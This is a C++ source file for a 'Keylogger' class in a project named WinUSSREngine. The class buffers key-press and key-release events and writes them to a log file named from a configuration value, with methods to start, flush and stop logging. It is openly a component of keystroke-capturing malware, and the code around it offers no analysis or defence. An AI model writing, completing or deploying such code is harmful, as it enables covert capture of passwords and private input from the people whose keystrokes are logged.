#include "Keylogger.h"
#include "Config.h"

namespace WinUSSREngine
{
	Keylogger::Keylogger() noexcept { init(); }

	void Keylogger::start(const std::string& name) noexcept
	{
		if (!m_keylogs.isInitialized())return;
		m_keylogs.open(name);
	}

	void Keylogger::start() noexcept
	{
		if (!m_keylogs.isInitialized())return;
		m_keylogs.open(config->AppConfig.Strings[5]);
	}

	void Keylogger::log() noexcept
	{

		if (!m_keylogs.isOpen())return;
		while (!m_keybuffer.empty())
			m_keylogs.writeToLog(m_keybuffer.toString());
	}

	void Keylogger::stop() noexcept
	{
		if (!m_keylogs.isOpen())return;

		if (!m_keybuffer.empty())
		{
			m_keylogs.writeToLog(m_keybuffer.toString());
		}

		m_keylogs.flush();
		m_keylogs.close();
	}

	bool Keylogger::OnKeyPressed(unsigned char e)
	{
		m_keybuffer.onKeyPressed(e);
		return true;
	}

	bool Keylogger::OnKeyReleased(unsigned char e)
	{
		m_keybuffer.onKeyReleased(e);
		return true;
	}

	void Keylogger::init() noexcept
	{
		if (!m_keylogs.isInitialized())
			m_keylogs.initLogging();
	}
}